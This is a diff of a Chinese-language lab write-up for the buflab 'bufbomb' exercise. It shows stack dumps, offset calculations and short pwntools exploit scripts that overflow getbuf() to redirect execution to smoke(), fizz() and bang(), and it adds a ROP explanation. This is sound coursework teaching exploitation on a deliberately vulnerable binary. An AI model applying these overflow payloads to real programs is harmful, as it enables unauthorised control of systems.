@@ -1,8 +1,20 @@
+{==更新：鉴于大家只是听了一点课，对于PWN之类的一般可能一点概念都没有，并且之前一版的文章同学们表示一些名词太多。对此，我决定还是多润色一下这篇文章，然后，还请各位先看一下这些文章预习一下，就能更好地做实验了：==}
+
+[栈介绍 - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro/)
+
+[栈溢出原理 - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic/)
+
+[基本 ROP - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/)
+
+{==如果你连这些都不知道的话，可能也就不知道我在下面讲什么了...==}
+
 开头惯例先膜一下大佬们：[@obliviate](https://cp32.github.io) [@Apeng](https://apeng.fun)
 
 题目存档：[buflab-handout.tar](./problems/buflab-handout.tar)
 
 ## 实验要求
+容我抄一下实验的PPT：
+
 ### 目标
 > 实验攻击目标的程序为bufbomb。该程序中含有一个带有漏洞的getbuf()函数，它所调用的系统函数gets()未进行缓冲区溢出保护。其代码如下：
 
@@ -30,6 +42,7 @@ int getbuf() {
 > 已知bufbomb中有test()函数将会调用getbuf()函数，并调用gets()从标准输入设备读入字符串。因此可以通过大于getbuf()中给出的数据缓冲区的字符串而破坏getbuf()栈帧，改变其返回地址——指向我们提供的攻击函数。
 
 #### 具体操作
+这个爱看不看，我下面写。
 
 > 使用gdb和objdump分析其栈帧结构，确定test()调用getbuf()后返回地址与buf缓冲区相对位置关系；
 >
@@ -44,20 +57,24 @@ int getbuf() {
 ## 开始折腾
 这个真的...很难讲清楚是怎么回事，我觉得主要还是自己调几次就会很直观了。
 
+更新：你可以用很多种方式来做这个实验。我再废话几句好了。
+
+现在实验是给出了一个二进制文件，它的函数调用存在漏洞，你可以利用这个漏洞破坏栈上的数据来，例如使函数返回到你所指定的函数上，甚至是获得目标主机的访问或是控制权（getshell）。有关详细信息，我还是建议查看[这里](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/)。
+
 ### smoke()
-不管上面怎么说，反正只记住了要求。先run一下看看：
+不管上面怎么说，反正我只记住了要求。先run一下看看：
 
 ![BUFFER_LAB_1.png](./img/BUFFER_LAB_1.png)
 
-指定一下队伍名称试试：
+要求必须指定一个队伍名称。指定一个试试，然后随意输了一个字符串：
 
 ![BUFFER_LAB_2.png](./img/BUFFER_LAB_2.png)
 
-把bufbomb拖到IDA里，开始调试。
+大概了解了。把bufbomb拖到IDA里，开始调试。
 
-进入`launch()`：
+跟随程序流程，进入`launch()`：
 
-``` c
+``` c hl_lines="30"
 int __usercall launch@<eax>(int a1@<eax>, int a2@<edx>)
 {
   int v2; // ebx
@@ -96,9 +113,9 @@ LABEL_8:
 
 ```
 
-随后调到了`test()`：
+随后跳进了`test()`：
 
-``` c tab="C"
+``` c tab="C" hl_lines="5"
 int test()
 {
   signed int v0; // edx
@@ -178,7 +195,7 @@ signed int getbuf()
 
 好了，重点来了。先来看看栈：
 
-```
+``` hl_lines="5 12"
 FFFAF240  F7FB9FC0  ld_2.29.so:__libc_enable_secure+CC
 FFFAF244  08048448  LOAD:byte_8048448
 FFFAF248  00000000  
@@ -193,10 +210,13 @@ FFFAF268  FFFAF288  [stack]:FFFAF288
 FFFAF26C  08048DB2  test+12  
 ```
 
+!!! tip
+    [What is the x86 “ret” instruction equivalent to?](https://stackoverflow.com/questions/20129107/what-is-the-x86-ret-instruction-equivalent-to)
+
 当前`v1`的地址是`0xFFFAF250`，所以需要一路覆盖到`0xFFFAF268`，一共4×7=28个`char`，然后将`smoke()`的地址`0x08048EB0`给到返回地址`0xFFFAF26C`上就可以了。于是有exp.py：
 
 !!! tip
-    [What is the x86 “ret” instruction equivalent to?](https://stackoverflow.com/questions/20129107/what-is-the-x86-ret-instruction-equivalent-to)
+    注意，这里使用的工具是[pwntools](https://github.com/Gallopsled/pwntools)，这可以大幅提高你的效率。有关详细信息，你可以查看[文档](http://docs.pwntools.com/en/stable/)。在Linux系统上进行安装是比较简单的，只需要参考文档中的几句命令即可。另外，对于Windows系统，你可以利用WSL来使用它。你可以参考我过往的文章来进行安装，可以在左侧栏或是上方搜索框中找到。
 
 ``` python
 from pwn import *
@@ -241,12 +261,29 @@ void __noreturn smoke()
 
 应该已经成功。
 
+!!! tip
+    我知道总是会有人问我不想用pwntools怎么办。对于这一题来说，你可以准备好payload，就像这样：
+    
+    ![BUFFER_LAB_3.png](./img/BUFFER_LAB_3.png)
+    
+    然后，这样子：
+    
+        cat ./payload | ./sendstring | ./bufbomb -t domain
+    
+    就可以得到：
+    
+    ![BUFFER_LAB_4.png](./img/BUFFER_LAB_4.png)
+    
+    可以看到，成功地调用了`smoke()`。
+    
+    另外，接下来我是不会继续讲不用pwntools怎么办的。
+
 ### fizz()
 这回需要调用一个函数并且传入参数。根据要求我们先来`makecookie`：
 
-![BUFFER_LAB_3.png](./img/BUFFER_LAB_3.png)
+![BUFFER_LAB_5.png](./img/BUFFER_LAB_5.png)
 
-好，先留下`domain`的Cookie：
+好，先留下domain的Cookie：
 
     0x6dfd74c3
 
@@ -308,7 +345,7 @@ void __cdecl __noreturn fizz(int a1)
 .text:08048EAE align 10h
 ```
 
-需要一个参数，所以可以exp.py：
+需要一个参数，所以可以有exp.py：
 
 ``` python hl_lines="5 6"
 from pwn import *
@@ -322,9 +359,12 @@ print(p.recv())
 
 ```
 
-可以当作就是在上次的基础上改了个函数地址`fizz`（`0x08048E60`），外加把参数放上去。
+可以当作就是在上次的基础上改了个函数地址`fizz`（`0x08048E60`），外加把参数放上去。你可能想知道为什么是这样，也可能想知道那个奇怪的0填充是什么，这个时候我们可以适当地在上面的脚本加`pause()`，然后用IDA`Attach to process...`，选中`bufbomb`就可以开始调试这个进程了。
 
-你可能想知道那个奇怪的0填充是什么，这个时候我们可以适当地在上面的脚本加`pause()`，然后用IDA`Attach to process...`。看看这次的栈：
+!!! warning
+    调试是很重要的。要是让我只看代码不调试，我可能几乎写不出payload。而且，当你的输入并没有得到预期的结果时，如果你不进行调试是很难发现问题所在的。关于如何进行调试，你很快就会在左侧栏或是上方搜索框中找到相关文章（或许吧）。
+
+看看这次的栈：
 
 ``` hl_lines="10"
 FFEC7250  61616161  
@@ -368,10 +408,14 @@ Process finished with exit code 0
 
 ```
 
-你要是还在纠结那个32位的0填充是啥可以找个正常的函数边调边看看栈就知道啦！另外，看了下面这关或许你也就知道了。
+你要是还在纠结那个32位的0填充是啥可以找个正常的函数边调边看看栈就知道啦，这和函数调用约定相关。另外，看了下面这关或许你也就知道了。
 
 ### bang()
-这回是要先改变一个全局变量`global_value`的值，然后再跳转到`bang()`函数。为了改变全局变量，我们可以通过调用`Gets()`并将变量地址传入，来对其进行修改，然后再跳转到`bang()`上就完成了。
+这回是要先改变一个全局变量`global_value`的值，然后再跳转到`bang()`函数。为了改变全局变量，我们可以通过调用`Gets()`并将该全局变量地址传入，来对其进行修改，然后再跳转到`bang()`上就完成了。
+
+另外，由于这个程序并没有禁止栈上执行，所以你想往缓冲区里写点汇编好像也没问题。但是，我是不会这样干的。
+
+> 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程**。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
 
 首先找一下`global_value`的地址：
 
@@ -425,7 +469,7 @@ Process finished with exit code 0
 
 ```
 
-看来没有问题，我们来attach上去看看运行得怎么样：
+看来没有问题，我们来attach上去跟着看看运行得怎么样：
 
 ```
 FF8DF26C  080489C0  Gets
